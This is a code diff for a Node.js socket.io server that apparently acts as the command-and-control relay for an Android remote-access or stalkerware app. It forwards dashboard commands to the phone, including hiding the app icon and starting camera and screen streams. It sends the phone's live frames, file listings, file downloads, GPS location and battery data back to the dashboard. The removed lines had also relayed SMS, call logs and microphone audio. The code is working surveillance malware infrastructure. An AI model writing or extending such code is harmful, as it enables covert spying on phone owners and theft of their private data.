@@ -5,79 +5,79 @@ const path = require('path');
 
 const app = express();
 const server = http.createServer(app);
+
+// Increase the limit for large Base64 strings (essential for 30 FPS streams)
 const io = new Server(server, {
-    maxHttpBufferSize: 1e8 // Increased to 100MB for file transfers
+    maxHttpBufferSize: 1e8, // 100 MB
+    cors: {
+        origin: "*",
+    }
 });
 
+// Serve the dashboard files from the "public" directory
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Store active connections
-let deviceSocket = null;
-let adminSocket = null;
+// Standard route for the dashboard
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
 
 io.on('connection', (socket) => {
     console.log('New connection:', socket.id);
 
-    // Identify if the connection is the Android device or the Dashboard
-    socket.on('register', (role) => {
-        if (role === 'device') {
-            deviceSocket = socket;
-            console.log('Android Device Connected');
-        } else if (role === 'admin') {
-            adminSocket = socket;
-            console.log('Admin Dashboard Connected');
-        }
+    // Identify if the connection is from the Device or the Web Dashboard
+    socket.on('register', (type) => {
+        socket.join(type); // Joins 'device' room or 'web' room
+        console.log(`Socket registered as: ${type}`);
     });
 
-    // 1. FORWARD COMMANDS: Dashboard -> Android Device
-    // Handles commands like 'get-gps', 'get-sms', 'stream:0:video'
+    /** * COMMAND ROUTING: Web -> Device
+     * Relays commands like 'stream:0:video', 'get-files', or 'hide-icon'
+     */
     socket.on('phone-execute', (cmd) => {
-        if (deviceSocket) {
-            console.log('Sending command to device:', cmd);
-            deviceSocket.emit('phone-execute', cmd);
-        }
+        console.log('Command received from web:', cmd);
+        io.to('device').emit('phone-execute', cmd); 
     });
 
-    // 2. FORWARD DATA: Android Device -> Dashboard
-    
-    // Live Camera/Screen frames
+    /**
+     * DATA RELAY: Device -> Web
+     * Relays the 30 FPS frame data for Camera and Screen streams
+     */
     socket.on('data-stream', (base64Data) => {
-        if (adminSocket) adminSocket.emit('data-stream', base64Data);
+        // High-frequency relay to all connected dashboard clients
+        io.to('web').emit('data-stream', base64Data);
     });
 
-    // Live Mic Audio
-    socket.on('audio-stream', (base64Audio) => {
-        if (adminSocket) adminSocket.emit('audio-stream', base64Audio);
+    /**
+     * FILE EXPLORER RELAY: Device -> Web
+     * Relays the JSON file list for the Windows-style explorer
+     */
+    socket.on('file-data', (jsonFiles) => {
+        io.to('web').emit('file-data', jsonFiles);
     });
 
-    // GPS Updates
-    socket.on('location-update', (data) => {
-        if (adminSocket) adminSocket.emit('location-update', data);
+    /**
+     * DOWNLOAD RELAY: Device -> Web
+     * Relays the actual file buffer as Base64 for the browser to download
+     */
+    socket.on('file-download-ready', (fileObj) => {
+        io.to('web').emit('file-download-ready', fileObj);
     });
 
-    // SMS and Call Logs
-    socket.on('sms-data', (data) => {
-        if (adminSocket) adminSocket.emit('sms-data', data);
-    });
-    
-    socket.on('call-data', (data) => {
-        if (adminSocket) adminSocket.emit('call-data', data);
-    });
-
-    // File Explorer Data
-    socket.on('file-data', (data) => {
-        if (adminSocket) adminSocket.emit('file-data', data);
+    /**
+     * SYSTEM STATUS RELAY: Device -> Web
+     * Relays Battery level and GPS coordinates
+     */
+    socket.on('battery-update', (val) => {
+        io.to('web').emit('battery-update', val);
     });
 
-    // File Downloads
-    socket.on('file-download-ready', (data) => {
-        if (adminSocket) adminSocket.emit('file-download-ready', data);
+    socket.on('location-update', (locData) => {
+        io.to('web').emit('location-update', locData);
     });
 
     socket.on('disconnect', () => {
-        if (socket === deviceSocket) deviceSocket = null;
-        if (socket === adminSocket) adminSocket = null;
-        console.log('User disconnected');
+        console.log('User disconnected:', socket.id);
     });
 });
 
